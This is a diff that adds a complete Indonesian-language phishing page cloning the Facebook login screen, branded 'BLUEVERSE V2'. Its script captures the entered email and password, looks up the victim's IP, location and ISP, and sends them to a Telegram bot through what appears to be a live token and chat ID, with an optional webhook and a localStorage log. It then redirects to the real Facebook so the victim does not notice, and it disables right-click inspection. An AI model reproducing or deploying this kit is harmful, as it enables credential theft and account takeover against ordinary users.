@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Facebook - Masuk atau Daftar</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .fb-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .fb-logo svg {
+            width: 240px;
+            height: 84px;
+        }
+        
+        .login-form {
+            margin-top: 10px;
+        }
+        
+        .input-group {
+            margin-bottom: 12px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #fff;
+        }
+        
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 16px;
+        }
+        
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        
+        .forgot-link {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .hr-divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-btn {
+            background: #42b72a;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        
+        .create-btn:hover {
+            background: #36a420;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 12px;
+            color: #8a8d91;
+        }
+        
+        .footer a {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: #1877f2;
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .error-message {
+            background: #be4b49;
+            color: white;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+        }
+        
+        @media (max-width: 450px) {
+            .container {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginContainer">
+        <div class="fb-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1366 768">
+                <path fill="#1877f2" d="M512 256h-64v-64c0-35.2 28.8-64 64-64h64V64h-64c-70.4 0-128 57.6-128 128v64h-64v64h64v256h96V320h64l32-64z"/>
+                <text x="512" y="200" font-size="48" fill="white" font-weight="bold" font-family="Arial">facebook</text>
+            </svg>
+        </div>
+        
+        <div class="login-form">
+            <div class="error-message" id="errorMsg">Email atau kata sandi salah.</div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" name="email" placeholder="Email atau nomor telepon" autocomplete="off" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Kata Sandi" required>
+                </div>
+                
+                <button type="submit" class="login-btn">Masuk</button>
+                
+                <div class="forgot-link">
+                    <a href="#">Lupa kata sandi?</a>
+                </div>
+                
+                <div class="hr-divider"></div>
+                
+                <button type="button" class="create-btn" onclick="alert('Fitur ini hanya untuk demo')">Buat Akun Baru</button>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Bahasa Indonesia</a> · 
+            <a href="#">English (US)</a> · 
+            <a href="#">Privacy</a> · 
+            <a href="#">Terms</a>
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Memverifikasi...</div>
+    </div>
+
+    <script>
+        // ============ KONFIGURASI TELEGRAM - GANTI PAPAK LO, BANGSAT! ============
+        // BUAT BOT DI @BotFather, DAPETIN TOKEN
+        const TELEGRAM_BOT_TOKEN = "8516747819:AAHhE-Xxcar6coHKaOQS7d4CE0-Z1BtxWa0";  // CONTOH: "6969696969:AAHhafhajkfhajkfhajkf"
+        const TELEGRAM_CHAT_ID = "8509633837";      // CONTOH: "1234567890"
+        
+        // KALO GAK PAKE TELEGRAM, ISI AJA KOSONG, NANTI PAKE LOCALSTORAGE
+        
+        // ============ FUNGSI DAPETIN INFO TARGET ============
+        async function getTargetInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'Tidak terdeteksi',
+                    city: data.city || '-',
+                    region: data.region || '-',
+                    country: data.country_name || '-',
+                    isp: data.org || '-',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timestamp: new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'})
+                };
+            } catch(e) {
+                return {
+                    ip: 'Tidak terdeteksi',
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toLocaleString('id-ID'),
+                    note: 'IP API gagal, tapi data tetap tersimpan'
+                };
+            }
+        }
+        
+        // ============ KIRIM KE TELEGRAM ============
+        async function sendToTelegram(email, password, info) {
+            if(TELEGRAM_BOT_TOKEN === "BOT_TOKEN_GANTI_INI" || TELEGRAM_CHAT_ID === "CHAT_ID_GANTI_INI") {
+                console.log('⚠️ Telegram belum dikonfigurasi, data hanya disimpan lokal');
+                return false;
+            }
+            
+            const message = `🔥 *FACEBOOK PHISHING HIT - BLUEVERSE V2* 🔥
+━━━━━━━━━━━━━━━━━━━━━━━━
+📧 *EMAIL/USER:* ${email}
+🔑 *PASSWORD:* ${password}
+━━━━━━━━━━━━━━━━━━━━━━━━
+📍 *INFO TARGET:*
+• IP: ${info.ip}
+• Lokasi: ${info.city}, ${info.region}
+• Negara: ${info.country}
+• ISP: ${info.isp}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🖥️ *DEVICE:*
+• OS: ${info.platform}
+• Browser: ${info.userAgent.split(' ')[0]}
+• Bahasa: ${info.language}
+━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ *WAKTU:* ${info.timestamp}
+🔥 *TOOL:* BLUEVERSE V2 - @KONTEN.RENDEM11
+👁️ *FOLLOW TIKTOK:* @KONTEN.RENDEM11`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const result = await response.json();
+                if(result.ok) {
+                    console.log('✅ Data terkirim ke Telegram');
+                    return true;
+                } else {
+                    console.log('❌ Gagal kirim ke Telegram:', result);
+                    return false;
+                }
+            } catch(e) {
+                console.log('❌ Error Telegram:', e);
+                return false;
+            }
+        }
+        
+        // ============ SIMPAN KE LOCALSTORAGE (BACKUP) ============
+        function saveToLocal(email, password, info) {
+            const data = {
+                email: email,
+                password: password,
+                info: info,
+                time: new Date().toISOString(),
+                source: "Facebook Phishing - BLUEVERSE V2"
+            };
+            
+            let saved = localStorage.getItem('fb_phish_logs') || '[]';
+            saved = JSON.parse(saved);
+            saved.push(data);
+            localStorage.setItem('fb_phish_logs', JSON.stringify(saved));
+            console.log('💾 Data tersimpan di localStorage');
+            
+            // Tampilkan di console biar gampang copas
+            console.log('========== DATA PHISHING ==========');
+            console.log('Email:', email);
+            console.log('Password:', password);
+            console.log('IP:', info.ip);
+            console.log('Lokasi:', info.city, info.region);
+            console.log('====================================');
+        }
+        
+        // ============ SIMPAN KE SERVER (OPSIONAL) ============
+        // KALO MAU PAKE WEBHOOK, ISI URL DI BAWAH
+        const WEBHOOK_URL = ""; // ISI KALO MAU PAKE WEBHOOK, KOSONGIN AJA KALO GAK
+        
+        async function sendToWebhook(email, password, info) {
+            if(!WEBHOOK_URL) return;
+            
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        victim_info: info,
+                        platform: "Facebook",
+                        creator: "@KONTEN.RENDEM11"
+                    })
+                });
+                console.log('✅ Data terkirim ke webhook');
+            } catch(e) {
+                console.log('❌ Webhook error');
+            }
+        }
+        
+        // ============ HANDLE FORM SUBMIT ============
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if(!email || !password) {
+                document.getElementById('errorMsg').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('errorMsg').style.display = 'none';
+                }, 3000);
+                return;
+            }
+            
+            // Tampilkan loading
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            // Dapetin info target
+            const victimInfo = await getTargetInfo();
+            
+            // Kirim data
+            await sendToTelegram(email, password, victimInfo);
+            await sendToWebhook(email, password, victimInfo);
+            saveToLocal(email, password, victimInfo);
+            
+            // Redirect ke Facebook asli biar target gak curiga
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com/login.php';
+            }, 1500);
+        });
+        
+        // ============ ANTI INSPECT ELEMENT (BASIC) ============
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Peringatan di console buat yang ngintip
+        console.log('%c🔴 PERINGATAN! 🔴', 'color: red; font-size: 20px; font-weight: bold;');
+        console.log('%cIni adalah halaman phising dari BLUEVERSE V2', 'color: orange; font-size: 14px;');
+        console.log('%cData Anda akan dikirim ke creator jika Anda mengisi form ini!', 'color: red; font-size: 12px;');
+        console.log('%cFollow TikTok: @KONTEN.RENDEM11', 'color: blue; font-size: 12px;');
+        
+        // Info di alert buat yang buka (opsional, hapus kalo mau sembunyi)
+        setTimeout(() => {
+            console.log('🔥 BLUEVERSE V2 - FACEBOOK PHISHING PAGE ACTIVE 🔥');
+        }, 1000);
+    </script>
+</body>
+</html>
